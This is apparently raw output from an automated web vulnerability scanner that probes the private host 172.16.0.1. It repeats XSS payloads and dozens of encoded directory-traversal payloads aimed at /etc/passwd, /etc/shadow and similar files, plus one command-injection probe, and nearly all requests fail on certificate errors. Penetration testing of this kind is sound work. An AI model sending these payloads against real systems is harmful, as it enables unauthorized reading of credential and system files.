+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/';alert(%22XSS%22);' (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/";alert("XSS")
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/';alert(%22XSS%22);' (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/";alert("XSS")
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22;alert(%22XSS%22) (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+
+http://172.16.0.1/%22;alert(%22XSS%22)
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22;alert(%22XSS%22) (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%22;alert(%22XSS%22)
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22;alert(%22XSS%22) (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/';alert("XSS")
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22;alert(%22XSS%22) (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/';alert("XSS")
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/';alert(%22XSS%22) (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/';alert(%22XSS%22)
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/';alert(%22XSS%22) (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/';alert(%22XSS%22)
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/';alert(%22XSS%22) (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+
+[-] Not XSS Vulnerable
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/';alert(%22XSS%22) (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+[-] Not XSS Vulnerable
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/hosts (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/hosts (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C%20%5C..%5C%20%5C..%5C%20%5C../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C%20%5C..%5C%20%5C..%5C%20%5C../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=....//....//....//....//....//....//....//....//....//....//etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=....//....//....//....//....//....//....//....//....//....//etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=....//....//....//....//....//....//....//....//....//....//etc/hosts (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=....//....//....//....//....//....//....//....//....//....//etc/hosts (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cgroup (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cgroup (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./etc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=.%5C./.%5C./.%5C./.%5C./.%5C./.%5C./etc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%00/ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%00/ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C.. (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C..%25%5C.. (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%2A (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%2A (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/../../../../../../../../../../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/../../../../../../../../../../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/../../../../../../../../../../etc/group (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/../../../../../../../../../../etc/group (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..//etc//passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..//etc//passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/../../../../../../../../../../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/../../../../../../../../../../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/&apos (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/&apos (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/%5C,%25ENV%5C,/ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/%5C,%25ENV%5C,/ (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../..%C0%AF../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/.../.../.../.../.../%0A (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/.../.../.../.../.../%0A (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%2A (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%2A (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2Fetc%2F%2Fpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2Fetc%2F%2Fpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%5E%5E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%5E%5E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/group (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/group (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%5C../%5C../%5C../%5C../%5C../%5C../%5Cetc/%5Cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%5C../%5C../%5C../%5C../%5C../%5C../%5Cetc/%5Cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/shadow%5E%5E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/shadow%5E%5E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/bin/id%7C (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/bin/id%7C (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=...//...//...//...//...//...//etc//passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=...//...//...//...//...//...//etc//passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%5C../..%5C../..%5C../..%5C../..%5C../..%5C../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%5C../..%5C../..%5C../..%5C../..%5C../..%5C../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%5C../..%5C../..%5C../..%5C../..%5C../..%5C../etc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/..%5C../..%5C../..%5C../..%5C../..%5C../..%5C../etc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%5C.../%5C.../%5C.../%5C.../%5C.../%5C.../%5Cetc/%5Cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/etc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/etc/group (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=.../.../.../.../.../.../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5Cetc%5Cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5C.%5Cetc%5Cgroup (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../%5C.../%5C.../%5C.../%5C.../%5C.../%5C.../%5Cetc/%5Cpasswd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/../../../../../../../../../../etc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/%00//%00//%00//%00//%00/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/etc/shadow (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/%00//%00//%00//%00//%00/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
